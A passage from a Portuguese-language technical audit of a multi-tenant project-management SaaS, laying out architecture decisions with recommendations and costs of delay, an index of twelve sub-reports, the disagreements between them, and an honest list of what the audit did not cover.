A refatoração é mecânica, mas no deploy toda query vira "miss" e o app faz um refetch geral. Em produção com vários usuários, isso é um pico de carga em cima de endpoints que hoje não paginam (`/dashboard/workspace` carrega tudo de todas as empresas do usuário). **Contorno:** faça a paginação e o `groupBy` dos endpoints pesados **antes** da mudança de chave, ou faça o deploy em janela de baixo uso.

**Risco transversal, e o mais provável de acontecer:** a Onda 1 não termina, porque ela não produz nada visível e sempre vai existir algo mais divertido para fazer. **Contorno:** trate a Onda 1 como um único bloco fechado, com data, e não comece a Onda 2 antes. É a única onda deste documento que eu não fatiaria.

---

## 7. Decisões de arquitetura a tomar

Cada decisão tem recomendação explícita e o **custo de adiar**, que é a parte que costuma faltar nesse tipo de lista. Nenhuma delas é reversível de graça depois.

---

### Decisão 1. Como garantir isolamento entre empresas: disciplina ou estrutura?

**As opções.** (a) Continuar como hoje, com cada service repetindo `month: { quarter: { companyId } }` e cada handler lembrando de usar a fonte certa. (b) Patch por endpoint com um decorator `@CompanyId()` que só lê `request.companyId`. (c) Estrutura: `Activity.companyId` denormalizado mais uma extensão do Prisma Client que injeta o filtro de tenant automaticamente, ou RLS no Postgres com `SET LOCAL app.company_id`.

**Recomendação: (b) agora, (c) na Onda 2.** O patch é urgente e cabe em dias; a estrutura é o que impede o próximo módulo de repetir. Não faça só (b), porque o padrão do erro é sistêmico: o filtro correto está repetido em 17 lugares e nada obriga sua presença.

**Custo de adiar.** Cada módulo novo é uma chance nova de repetir o furo, e você não vai lembrar de auditar. E no dia da primeira venda com questionário de segurança, "confiamos que o desenvolvedor lembrou" não é resposta. Também é o que impede escrever um teste genérico de tenancy: sem um ponto único, o teste precisa conhecer cada rota.

---

### Decisão 2. Como resolver a falta de ano: `Quarter.year` ou sair da hierarquia?

**As opções.** (a) Adicionar `year Int` a `Quarter`, unique `[companyId, year, label]`, seeding lazy por ano, `?year=` em todos os endpoints. Esforço G, migração previsível. (b) Parar de derivar o período da hierarquia `Month` e usar campos próprios em `Activity` (`companyId`, `startDate`, `dueDate`, `periodKey YYYY-MM`), mantendo `Month` como agrupamento legado. Esforço GG, mas resolve também a duplicação `Month` versus `RoadmapMonth`.

**Recomendação: (a) agora, com (b) como direção declarada.** Faça `Quarter.year` na Onda 2 junto com `Activity.companyId` (as duas migrations conversam, porque o backfill de uma facilita a outra). Deixe escrito na spec que o destino é (b), para que nenhuma feature nova aprofunde a dependência da hierarquia.

**Custo de adiar.** É o custo que mais cresce sozinho de toda a lista. Cada mês de uso adiciona linhas que a migração vai precisar reclassificar, e cada feature de calendário construída em cima da estrutura atual precisa ser refeita. Além disso, o produto **degrada sozinho na virada do ano**: em janeiro de 2027 o board de janeiro passa a mostrar dois anos misturados sem filtro possível. Se você tem cliente que usa desde 2026, esse prazo é real e tem data.

---

### Decisão 3. Um board ou dois?

**O contexto.** Existem duas implementações independentes do mesmo kanban, com DnD diferente (HTML5 nativo versus `vue-draggable-plus`), endpoint de persistência diferente (`/status` versus `/move`), filtros diferentes e **escala de prioridade invertida entre si**. Mais uma terceira morta.

**As opções.** (a) Manter dois e sincronizar na unha. (b) Um único `<KanbanBoard>` com uma prop de escopo (`{ companies, months, people }`) e um único caminho de dados, com as duas rotas continuando a existir e mudando só o escopo default: `/board` igual a todas as empresas no trimestre corrente, `/tasks/:month` igual a uma empresa e um mês.

**Recomendação: (b), na Onda 2, junto com o filtro.** Resolve de uma vez o filtro combinado, a consistência de prioridade, a ordem manual, o suporte a toque (o DnD nativo do `/board` não dispara em eventos de toque, e não existe polyfill; o outro board usa sortablejs que suporta) e boa parte da dívida de arquitetura.

**Custo de adiar.** Toda melhoria de board precisa ser feita duas vezes ou fica inconsistente, e a inconsistência já está visível para o usuário na prioridade. Quanto mais você investir no card grande e nos filtros antes de unificar, mais caro fica.

---

### Decisão 4. Um roadmap ou dois?

**O contexto.** `Month` (hierarquia de tarefas, 1 a 12, sem ano) e `RoadmapMonth` (roadmap mensal, 0 a 11, com ano) são hierarquias paralelas sem FK. Mais três representações de data: `Activity.dueDate` como DateTime, `RoadmapEntry.date` e `RoadmapMilestone.date` como String. Mais dois conceitos concorrentes de "marco": `RoadmapEntry` com `category: milestone` na visão mensal, e `RoadmapMilestone` na timeline anual, que nunca aparecem um na tela do outro.

**As opções.** (a) Projeção read-only: o roadmap passa a **derivar** entregas de `Activity.dueDate` sem duplicar dado. (b) Consolidação: uma entidade de período por company mais ano mais mês, com atividades, focos, fotos e agenda penduradas nela, e um único modelo de marco.

**Recomendação: (a) na Onda 2, (b) só depois da Decisão 2.** A projeção resolve a queixa visível e é reversível. A consolidação é esforço GG e depende da hierarquia de período estar resolvida, senão você consolida em cima de um modelo que vai mudar.

**Custo de adiar.** Manter dois dobra o custo de toda feature de calendário, e o usuário continua cadastrando a mesma informação em dois lugares, o que é a razão de o roadmap "estar fraco". Migrar `RoadmapEntry.date` e `RoadmapMilestone.date` de `String` para `@db.Date` deveria acontecer junto, porque hoje é impossível fazer range query eficiente e impossível unir com `Event.startDate` numa query só.

---

### Decisão 5. Qual é a escala de prioridade?

**As opções.** (a) P0 a P3 com 0 igual a crítico, estilo Azure e Jira, que é o que o `/board` e a tela de detalhe usam e o que você fala. (b) 0 a 5 com 0 igual a "baixíssima", que é o que o `KanbanBoard` e o formulário de criação usam.

**Recomendação: (a), P0 crítico, com 4 níveis.** Três razões: é o vocabulário que você já usa; é o padrão das ferramentas que você cita como referência; e o default do backend (`priorityNumber ?? 0`) fica coerente com "sem prioridade definida" se e somente se você tratar 0 como um nível explícito e não como default silencioso.

**Consequência que precisa entrar na conta:** escolher (a) inverte o significado dos dados existentes criados pelo formulário. Ou seja, essa decisão exige uma **migração de dados** (`UPDATE Activity SET priorityNumber = ...` com um mapa), e ela precisa acontecer no mesmo deploy que a fonte única `priority.ts`. Se não fizer a migração, toda tarefa criada pelo formulário até hoje vira crítica.

**Custo de adiar.** Cada dia que passa cria mais dados sob a semântica ambígua, e a migração fica mais arriscada. E enquanto isso o usuário vê a mesma tarefa como vermelha crítica e verde baixíssima em duas telas.

---

### Decisão 6. Três shells, dois ou um?

**O contexto.** `CommandShell`, `FocusShell` e `CanvasShell`, mais 16 componentes `shared/`. O CanvasShell já está desligado por feature flag e tem dois botões que mentem sobre o que fazem. O FocusShell perde destinos e a coluna de contexto só é contextual dentro de `/tasks`. Toda feature nova precisa ser registrada em três lugares, e comprovadamente ninguém registra em todos.

**Recomendação: matar o CanvasShell e transformar o FocusShell num modo do CommandShell.** Concretamente: uma registry única de navegação (Decisão implícita, item 2.9 do roadmap), um shell com duas variantes de densidade ("sidebar" e "rail compacto mais coluna de contexto"), e a coluna de contexto recebendo conteúdo por rota via slot. Isso reduz superfície em ~2.500 linhas e concentra o polimento onde 100% dos usuários estão.

**Alternativa aceitável:** manter os dois shells mas obrigar os dois a consumirem a mesma registry. Você fica com o custo de dois CSS, mas nunca mais perde um destino.

**Custo de adiar.** O trabalho de responsividade (que não existe em nenhum dos três) triplica de custo enquanto forem três esqueletos. E o "estilo 2 não funciona bem" continua verdadeiro, porque a causa não é estética.

---

### Decisão 7. Eventos de realtime ad-hoc ou envelope único?

**O contexto.** Hoje adicionar um evento custa cinco pontos de edição no front (tipo no back, tipo no front, campo no `RealtimeHandlers`, um `off()`, um `on()` e um `forEach`). Esse é o motivo estrutural de o realtime ter parado em 11 eventos e cobrir 1 dos 15 caminhos de escrita.

**Recomendação: envelope único.** Um evento `wf:event` com `{ v: 1, type: 'activity.updated', companyId, entityId, actorId, at, patch? }`, um `emitDomain(companyId, type, payload)` no `RealtimeService` chamado por interceptor ou decorator nos services, e no front um `useDomainEvents(filter, handler)` que já filtra `companyId` automaticamente e mapeia `type -> queryKeys a invalidar` numa tabela única. Adicionar um evento passa a custar uma linha de cada lado.

**Faça na Onda 2, antes de somar mais eventos um a um.** Se você adicionar os três eventos de atividade no formato atual e depois migrar, paga duas vezes.

**Custo de adiar.** O realtime continua sendo a fonte da percepção de "o app não atualiza", e cada evento novo aumenta o custo da migração futura. E sem envelope não dá para fazer o catch-up por cursor, que é o que elimina de vez a perda de eventos numa queda de rede.

---

### Decisão 8. Uma instância para sempre, ou Redis agora?

**O contexto.** A presença vive num `Map` na memória do processo, o `intelligence.reindexing` é um `Set` local, o `google.lastSyncAt` é outro `Map`, o socket.io não tem adapter, e o Hocuspocus mantém o Y.Doc na memória. Com duas instâncias, um `emit` da instância A nunca chega em quem está na B, os três crons rodam duplicados, e dois usuários no mesmo board em instâncias diferentes editam documentos divergentes.

**Recomendação: garantir `replicas: 1` no Railway hoje e documentar isso, e ligar Redis só quando a carga justificar.** Ligar Redis agora é otimização prematura; **não saber** que só pode rodar uma réplica é acidente esperando acontecer, porque a reação natural a "está lento" é subir mais uma instância.

**Custo de adiar.** Baixo enquanto for uma réplica e estiver documentado. Alto e silencioso se alguém escalar sem saber: os sintomas ("às vezes não atualiza", "notificação duplicada no Discord") são exatamente os mesmos dos bugs de realtime que você já tem, então o diagnóstico fica impossível.

---

### Decisão 9. Embeddings dentro ou fora do processo HTTP?

**O contexto.** O cron de embeddings roda a cada 10 minutos, itera todas as empresas, faz reindexação **total** por empresa que mudou, e roda o modelo transformers.js **serialmente no mesmo processo Node que atende o HTTP**. Node é single-threaded: durante isso todo request fica na fila. A busca semântica carrega todos os vetores da empresa para a memória e calcula cosseno em JS, porque a coluna é `Float[]` e não `pgvector`.

**Recomendação: `pgvector` com índice HNSW mais worker separado para geração, e reindexação incremental por entidade.** O Supabase já tem pgvector. Isso é Onda 3 item 3.15 e é o item que mais protege você de um incidente de disponibilidade.

**Custo de adiar.** É literalmente o que quebra primeiro se o uso dobrar. E o custo marginal zero dos embeddings locais, que é uma vantagem real de margem, vira uma desvantagem de disponibilidade se ficar dentro do processo que atende cliente.

---

### Decisão 10. Vuetify: ficar ou sair?

**O contexto.** Só 23 dos 95 arquivos `.vue` usam algum `<v-*>`, com cerca de 250 tags, concentradas em `v-dialog`, `v-menu`, `v-list` e `v-text-field`. Zero uso de `v-select`, `v-autocomplete` e `v-combobox`, porque o projeto já tem `AppSelect.vue` próprio usado em 15 arquivos. O `reka-ui` (headless, tree-shakeable) já está instalado e não é usado. O Vuetify traz 888 KB de CSS não minificado e obriga o hack de `!important` em `App.vue` para não brigar com os tokens do projeto.

**Recomendação: sair, faseado, sem prazo agressivo.** Passo 1 (Onda 1): remover o barril `import * as components` e deixar o `autoImport` trabalhar, o que já derruba a maior parte do CSS. Passo 2 (Onda 3): construir `Dialog`, `Menu`, `List` e `Input` como primitivos próprios sobre `reka-ui`, dentro do trabalho de primitivos que já está planejado. Passo 3: remover a dependência.

**Custo de adiar.** Baixo no curto prazo, e por isso não é urgente. O custo real é que os primitivos da Onda 3 vão ser construídos **em cima** do Vuetify se a decisão não estiver tomada, e aí sair fica caro de verdade. Decida antes de escrever o primeiro primitivo, mesmo que execute depois.

---

### Decisão 11. Arquitetura de marca: mascote como logo ou como ilustração?

**As opções.** (a) Mascote é o logo. Exige simplificar para 3 formas legíveis em 16px monocromático e ter versão mono. (b) Símbolo próprio do Workflow, derivado da xícara mas simplificado, com "by Stack Roads" no login e no rodapé; mascote vira ilustração de estados vazios, onboarding e login, nunca logo.

**Recomendação: (b).** Mascote é ótimo em 148px na tela de login e péssimo em 16px na aba do navegador ou em 18px num chip de card. A versão atual tem detalhes de 1px que somem em 18px, e o produto hoje mostra **duas versões diferentes do mesmo mascote a 9px de distância** em toda tela.

**E a decisão comercial que anda junto:** separar "Workflow" de "Stack Roads" como marcas. É honesto, vende as duas, e evita o conflito no dia em que uma agência concorrente for avaliar a compra.

**Custo de adiar.** Cada tela nova, cada e-mail transacional, cada PDF exportado e cada QR gerado é um ponto de contato que vai ser construído com a marca errada e vai ter que ser refeito. E o portal do cliente da Onda 3 é justamente o lugar onde a marca precisa estar resolvida, porque quem olha é o cliente do seu cliente.

---

### Decisão 12. Onde mora a verdade da empresa ativa?

**O contexto.** Três fontes concorrentes (localStorage, `workspaceStores.activeCompanyId`, `authStores.companyId`), lidas em 34 pontos, com fallbacks encadeados que usam stores **diferentes** como primeira opção. E as query keys não são prefixadas por empresa, então a mesma chave de cache guarda respostas de empresas diferentes.

**Recomendação: `useWorkspaceStore.activeCompanyId` como fonte única, localStorage só para hidratação no boot, `authStores.ts` deletado, e toda query key nascendo de `key(companyId, ...rest)` num `composables/queryKeys.ts`.** Mais uma regra de lint proibindo `localStorage.getItem('activeCompany')` fora de `api.ts` e do boot.

**Custo de adiar.** Bugs intermitentes de "abri a tela e veio da empresa errada", que são caros de diagnosticar e destroem confiança. E, mais importante: a chave prefixada por empresa é o que transforma isolamento em invariante estrutural em vez de disciplina, e é pré-requisito da invalidação dirigida por evento de socket (Decisão 7).

---

### Decisão 13. Anexos em bucket público ou privado?

**O contexto.** Todo anexo de atividade, foto de roadmap, thumbnail de board, imagem de variável e vídeo de bug report vai para um único bucket público, com nome `${Date.now()}-${filename}`, sem `companyId` no path, sem signed URL e sem expiração. E quase nenhum `FileInterceptor` valida mimetype ou tamanho.

**Recomendação: bucket privado com signed URL de curta duração, path `company/<id>/<uuid>-<nome>`, e `limits` mais `fileFilter` em todo `FileInterceptor`.** Esforço M.

**Quando.** Onda 2 ou início da Onda 3, e obrigatoriamente **antes** do portal do cliente, porque o portal multiplica a superfície de arquivos que saem da empresa.

**Custo de adiar.** Um `contrato-cliente.pdf` de um cliente seu acessível a quem tiver o link é um problema contratual, não técnico. E a migração fica mais cara conforme o volume de arquivos cresce, porque exige reescrever URLs já persistidas.

---

### Decisão 14. Contrato front-back: `any` ou tipos gerados?

**O contexto.** 62 `Promise<any>` só na camada `service/`, 11 cópias do mesmo `handleRequest`, e um tipo "oficial" em `core/types` que **diverge da API** (usa `assignees: string[]` e `status: 'todo'` minúsculo, enquanto a API devolve `responsibles: [{ userId, user }]` e `status: 'TODO'`). O `vue-tsc` passa limpo e não protege nada nos caminhos que importam.

**Recomendação: gerar `api-types.d.ts` com `openapi-typescript` a partir do Swagger que a API já expõe, num script `npm run api:types`, versionando o arquivo.** Mais `service/http.ts` com um `handleRequest` compartilhado, e a regra "nenhum PR novo introduz `Promise<any>`".

**Quando.** Onda 2, antes das fases de edição direta. Refatorar auto-save sobre 40 `any` num arquivo de 2.293 linhas é roleta russa.

**Custo de adiar.** Cada refatoração grande da Onda 2 e da Onda 3 é feita sem rede. E renomear um campo na API continua não quebrando o build do front: quebra a tela do cliente.

---

## 8. Apêndice: índice dos doze relatórios

Todos em `c:/tmp/wf-analise/`. Somam 7.804 linhas. A coluna "onde este documento usa" indica onde o material foi mais aproveitado, e serve para você saber onde buscar o detalhe que aqui está resumido.

| Arquivo | Linhas | O que tem dentro | Onde este documento usa |
|---|---:|---|---|
| **`produto.md`** | 591 | Análise de produto e negócio. Inventário funcional completo dos módulos da API, o que está morto ou órfão, proposta de valor real e para quem, os dois erros de modelagem que travam tudo (ano e Projeto/Cliente), o funil de onboarding passo a passo até o beco sem saída, ativação e retenção, monetização (checklist de 16 requisitos de prontidão comercial), integrações existentes com avaliação de valor, IA e copilot, 16 problemas numerados, 14 oportunidades priorizadas, o wedge do cliente do seu cliente, e sequência sugerida em 4 blocos | Seções 1, 3 (Problema 6), 5 inteira |
| **`board-front.md`** | 508 | O board no front. Mapa dos **três** boards existentes (`/board`, `/tasks/:month` e a `WorkspaceView` morta) com tabela comparativa, de onde vem a lista de tarefas, filtros existentes, drag and drop, empresa ativa, realtime. 14 problemas incluindo o card de outra empresa que sempre falha, subtarefas contadas como tarefas, prioridade contraditória, ordem manual destruída, board sem toque e sem teclado. 8 oportunidades incluindo board único com escopo configurável e agrupamento por swimlanes | Seções 3 (Problema 9), 4.1, 4.6 |
| **`tasks-front.md`** | 678 | A área de tarefas no front. Mapa dos 7 arquivos (~4.736 linhas), quebra interna do `TaskDetailsView.vue` de 2.293 linhas mostrando que são 6 telas empilhadas, ciclo de vida completo de uma tarefa na UI, 24 problemas incluindo o XSS, P0 virando P1, data que não sai, e a seção 4 com o **plano ponta a ponta de migração para edição direta** campo a campo, incluindo as regras de debounce, conflito e acessibilidade. 10 oportunidades | Seções 3 (Problemas 3 e 9), 4.2, 4.7 |
| **`roadmap-front.md`** | 659 | O roadmap no front (`RoadmapView.vue`, 4.563 linhas). Os dois modos numa tela só, fluxo de dados de cada um, a queixa das datas de entrega com as **três rupturas** detalhadas, confirmação de que os dados não são mais mockados (a doc está errada), comparação item a item com a spec, 17 problemas incluindo dias que são botões inertes e marcos inatingíveis, 8 oportunidades incluindo roadmap alimentado pelas tarefas e roadmap público que vende | Seções 4.3, 4.4 (impressão), 4.8 |
| **`roadmap-api.md`** | 413 | Roadmap e tempo na API. Os **dois roadmaps sem relação entre si**, tabela de endpoints e o que cada um retorna, campos de data que existem no modelo, 17 problemas incluindo três vazamentos cross-tenant, ausência de ano, datas como String, e a seção 4 com a lista completa do que falta na API para um roadmap forte (fundação temporal, campos novos em `Activity`, modelos novos, 6 endpoints novos). 8 oportunidades | Seções 3 (Problemas 1 e 5), 4.3, 7 (decisões 2 e 4) |
| **`board-tasks-api.md`** | 554 | Board e tarefas na API. Descobre que o board não mora no módulo `board/` (que é o canvas), modelo de dados completo com o que existe e o que falta, tabela de endpoints e filtros aceitos (nenhum aceita responsável, nenhum pagina), 15 problemas incluindo a cadeia de exploração cross-tenant em 8 passos, subtarefas órfãs virando cards, reordenação com N updates, responsáveis de outra empresa. 9 oportunidades incluindo o `GET /activities` com filtros compostos | Seções 3 (Problemas 1, 5, 9), 4.1, 4.2 |
| **`realtime.md`** | 721 | Socket.io, cache e estado de tela. **Inventário completo dos 11 eventos emitidos** com room, origem e payload, tabela de consumidores no front, configuração do TanStack. 17 problemas incluindo socket que sobrevive ao logout, usuário removido que continua nas rooms por 7 dias, o diagnóstico em 4 partes da queixa de voltar e perder o lugar, feed de outra empresa injetado, cache mutado por fora do TanStack. Tabela final evento por evento com quem consome e se invalida a query certa. 6 oportunidades | Seções 3 (Problemas 7 e 8), 4.6 |
| **`shells-nav.md`** | 847 | Shells e navegação. Cadeia de montagem, anatomia comparada dos três shells, e a **matriz de 13 destinos por 8 superfícies de navegação** mostrando exatamente o que some em cada shell. 22 problemas incluindo "Usuários" que nunca aparece no shell padrão, coluna de contexto redundante, árvore que nasce fechada em deep link, zero responsividade, zero ARIA, "Forge" como título, XP que remove a troca de empresa. 8 oportunidades incluindo a registry única e a coluna de contexto de verdade. Veredito explícito sobre o FocusShell e sobre o modo XP | Seções 4.5, 4.6, 7 (decisão 6) |
| **`design-system.md`** | 760 | Design system e marca. **Análise binária dos PNGs pixel a pixel**, com histograma de alpha, scanlines provando o halo creme, e cálculo de contraste WCAG de cada cor da marca e de cada token. 19 problemas incluindo alpha sujo, contraste 1,17:1 no dark, três marcas convivendo, mesmo PNG como avatar de todas as empresas, cores de status reprovadas no light, hierarquia de texto colapsada, aumento de fonte que não aumenta nada, 268 declarações abaixo de 12px. 7 oportunidades incluindo sistema de marca em SVG, `CompanyAvatar` e tokens v2 com teste de contraste em CI. Gera dois PNGs de prova visual | Seções 4.4, 6 (Ondas 1 e 2), 7 (decisão 11) |
| **`arch-front.md`** | 728 | Arquitetura do front. Números da base (95 `.vue`, 55.260 linhas, 24.502 de CSS scoped, 0 testes, 0 rotas lazy, bundle de 8,3 MB), top 15 maiores arquivos. 16 problemas incluindo zero code splitting em três camadas, troca de empresa que não limpa cache, logout que não limpa nada, três fontes de verdade para empresa ativa, mock de 2024 em produção, ~1.900 linhas órfãs, camada de serviços sem contrato. 10 oportunidades. Termina com uma **seção explícita do que já está bom** | Seções 2, 3 (Problemas 8 e 10), 4.8, 7 (decisões 10, 12, 14) |
| **`arch-api.md`** | 599 | Arquitetura da API. Mapa de bootstrap, autenticação e autorização, fluxo de dados de tarefa. 23 problemas incluindo os cinco vazamentos cross-tenant com prova de conceito, `GET /user` global, `github-connection` sem empresa, import com empresas hardcoded, chave de criptografia com fallback, bucket público, realtime em 3 de 15 caminhos, papel que vive no JWT de 7 dias, modelos mortos no schema. 11 oportunidades incluindo `companyId` denormalizado, camada de tenant, audit trail, API pública v1 | Seções 3 (Problemas 1, 4, 7), 4.8, 7 (decisões 1, 8, 13) |
| **`qualidade.md`** | 746 | Qualidade e operação. Tudo verificado rodando comando, com output transcrito. Testes (1 arquivo, e é scaffold), CI (não existe), lint (572 problemas na API, 282 no front, com distribuição por regra), tipagem, migrations (status limpo, mas o script manual é bomba-relógio), **variáveis de ambiente e segredos** (dev aponta para produção, senha fraca de superusuário), observabilidade, deploy (`start:prod` aponta para arquivo inexistente), backup (não existe), riscos de segurança operacionais, e a seção 11 com **o que quebra primeiro se o uso dobrar**, em ordem | Seções 3 (Problemas 2, 3, 4, 10), 6 (Onda 1), 7 (decisão 9) |

### 8.1 Divergências entre relatórios, consolidadas

Os relatórios foram escritos por agentes independentes e em alguns pontos discordam. Onde discordam, isso está sinalizado no corpo do documento; aqui está a lista completa, com minha leitura e o motivo.

| # | Divergência | O que cada lado diz | Minha leitura e por quê |
|---|---|---|---|
| 1 | **Causa da queixa do roadmap** | `roadmap-api.md` P5: "causa raiz única e exata, o `select: { status: true }` em `quarter.service.ts:91`". `roadmap-front.md` P-01: "três rupturas independentes" | **`roadmap-front.md` está mais provavelmente certo sobre o efeito prático.** Corrigir só o `select` não muda nada na tela, porque o front continua sintetizando barras de mês em `RoadmapView.vue:457-478` e ignorando o payload novo. O `select` é necessário e não é suficiente. Elos 1 e 2 juntos entregam o mínimo visível; o elo 3 (`RoadmapEntry.activityId`) só é preciso para o modo calendário |
| 2 | **`switchCompany` com reload duro: bug ou acerto?** | `board-front.md` P14: é problema, "perde tudo, pisca branco". `arch-front.md` P-02: é a versão **correta**, e está morta enquanto a errada roda em produção | **Os dois têm razão em eixos diferentes.** Reload duro é seguro e ruim de UX; soft switch é bom de UX e inseguro. Saída que resolve os dois: soft switch mais `queryClient.clear()` mais chaves prefixadas por empresa, mantendo a rota atual |
| 3 | **`vueDevTools()` vai para produção?** | `arch-front.md` P-01 item 5: "injeta overlay e cliente de inspeção no build de produção". `qualidade.md` seção 12: "o plugin só aplica em `serve`" | **`qualidade.md` está mais provavelmente certo**, porque `vite-plugin-vue-devtools` declara `apply: 'serve'` internamente. Baixo risco de qualquer forma; tornar explícito custa uma linha e elimina a dúvida |
| 4 | **A queixa do roadmap é consequência da falta de ano?** | `produto.md` P5 e P6 e `board-tasks-api.md` P2 tratam como consequência. `roadmap-api.md` e `roadmap-front.md` tratam como problema separado | **Camadas diferentes, os dois certos.** A falta de ano não impede as datas de aparecerem hoje, mas impede o roadmap de ser navegável por ano depois. Corrigir só um entrega meia solução |
| 5 | **Contagem de `any` no front** | `arch-front.md`: 160 ocorrências de `: any`. `qualidade.md`: 247 erros de `no-explicit-any` no ESLint | Não é contradição: métodos de contagem diferentes (anotação `: any` versus toda ocorrência explícita, incluindo `as any`, `any[]` e genéricos). Use 247 como número de referência, porque é o que o lint vai cobrar |
| 6 | **Quantidade de módulos na API** | `produto.md`: 41 módulos. `arch-api.md`: 37 módulos | Provavelmente pasta em `src/` versus módulo Nest registrado no `AppModule`. Não muda decisão nenhuma |
| 7 | **`onReconnect` dispara ou não ao voltar para o board?** | `realtime.md` P-03b: nunca dispara, porque o socket já está conectado. `board-front.md` P8 e `realtime.md` P-10: dispara e causa carregamento duplicado | **Os dois, em situações diferentes.** No F5 frio o socket conecta depois do mount e o handler dispara (duas requisições). Na navegação de volta dentro da SPA o socket já está conectado e nada dispara (dado velho). É exatamente por isso que o bug parece aleatório, e essa observação está no corpo, seção 3, Problema 7 |
| 8 | **Migrations pendentes em produção** | A memória do projeto registra "migrations pendentes de apply em prod". `qualidade.md` 5.1 rodou `prisma migrate status` e obteve "Database schema is up to date", contra o banco do `.env` local, que é o de produção | **`qualidade.md` está certo e a memória está desatualizada.** Vale corrigir a memória. Ressalva importante: o "up to date" pode ser resultado de alguém ter rodado `migrate resolve --applied` na mão, porque o script manual não escreve em `_prisma_migrations`. Ou seja, está limpo hoje por caminho não documentado |
| 9 | **O roadmap usa dados mockados?** | `src/CLAUDE.md` afirma "Timeline anual + calendários mensais mockados". `roadmap-front.md` seção 3 varreu o arquivo e não encontrou nenhum mock | **A documentação está errada.** O que sobrou da era mock é CSS órfão e computeds sem consumidor. Corrigir a doc está na Onda 1 |

Um padrão que vale notar nessa lista: **cinco das nove divergências não são contradição, são a mesma coisa vista de camadas diferentes.** Isso é sinal de que a auditoria foi bem particionada, e também um alerta: quando dois relatórios apontam para o mesmo sintoma com causas diferentes, provavelmente as duas causas existem e a correção precisa das duas.

---

### 8.2 O que a auditoria não cobriu

Tão importante quanto o que foi visto é saber o que não foi. Os doze relatórios cobriram board, tarefas, roadmap, realtime, shells, design system, arquitetura dos dois repositórios, produto e operação. **Ficou de fora, e não há informação confiável neste documento sobre:**

**Áreas do produto não auditadas em profundidade.** Notas e o editor TipTap, calendário e a integração OAuth com o Google, a tela de time tracking no front, o front de QR codes, o front do bug report, o painel do assistente, a tela de configurações, o browser de repositórios, o dashboard, as variáveis de empresa, o canvas colaborativo e as views públicas. Elas aparecem citadas de passagem em vários relatórios, mas ninguém sentou para mapear cada uma. Presuma que problemas do mesmo tipo existem lá.

**Qualidade e custo da IA.** Ninguém avaliou a qualidade real das especificações que o Claude gera a partir dos vídeos, nem a taxa de acerto do agente, nem o custo por operação. Isso é um buraco relevante, porque o wedge da seção 5 depende de a especificação gerada ser boa o bastante para não precisar de edição manual. **Antes de apostar o posicionamento nisso, meça:** pegue 20 bug reports reais e conte quantos foram para o board sem edição.

**Performance real em produção.** Todos os problemas de performance citados são análise estática (query sem `take`, N+1, ausência de índice, cosseno em JS). Ninguém mediu latência real, ninguém olhou `pg_stat_statements`, ninguém sabe o tamanho atual das tabelas. É possível que alguns "vai quebrar" ainda estejam a anos de distância, e que algo não listado esteja quebrando hoje.

**Acessibilidade ponta a ponta.** O relatório de shells contou `:focus-visible` e ARIA nos três shells (zero em todos) e o de design system calculou contraste de tokens. Ninguém rodou axe, ninguém testou com leitor de tela, ninguém validou navegação por teclado nas telas de trabalho. Para um programa declarado de acessibilidade 50+, essa é uma lacuna que vale fechar.

**Aspecto jurídico e contratual.** LGPD aparece como checklist de features faltantes, não como análise. Não há avaliação de contrato, de política de privacidade, de DPA nem de retenção de dado. Antes do primeiro contrato formal, isso precisa de alguém que não seja um agente de código.

**Mercado e preço.** Os números de preço da seção 5.4 são opinião fundamentada, não pesquisa. Ninguém entrevistou agência nenhuma, ninguém validou disposição a pagar, ninguém comparou proposta comercial real de concorrente no Brasil. Trate como hipótese a testar com os clientes que você já tem, não como plano.

**Comportamento de usuário.** Não existe dado nenhum, porque o PostHog só captura `$pageview`. Tudo neste documento sobre "o usuário sente" é inferência a partir do código e das suas queixas. Depois da instrumentação da Onda 1, várias conclusões daqui vão poder ser confirmadas ou derrubadas com dado, e algumas vão ser derrubadas.

**E, de novo, o principal: a verificação adversarial.** Nenhum achado foi lido duas vezes por olhos independentes. A taxa de erro esperada num trabalho desse tipo sem verificação não é zero.

---

### Como usar este apêndice

- Precisa do detalhe de um problema citado aqui? Procure pelo identificador original (`P1`, `P-03`, `2.1`) dentro do relatório indicado na coluna da direita.
- Vai atacar uma área inteira? Leia o relatório dela inteiro antes, porque cada um tem um mapa técnico de "como funciona hoje" que este documento resumiu.
- Vai atacar segurança? Leia `arch-api.md` seção 2.1 e `board-tasks-api.md` P1 juntos: eles descrevem a mesma cadeia por ângulos diferentes e um preenche as lacunas do outro.
- Vai atacar o roadmap? Leia `roadmap-front.md` seção 2 e `roadmap-api.md` seção 1.4 juntos, e tenha em mente a divergência apontada na seção 4.3 deste documento.

### Lembrete final

Nada disso passou por verificação adversarial. Antes de mexer em qualquer item marcado com `confirmar antes de agir`, reproduza. Leva 5 minutos por item e evita duas coisas caras: corrigir um problema que não existe, e correr para corrigir um problema que é pior do que o relatório descreveu.

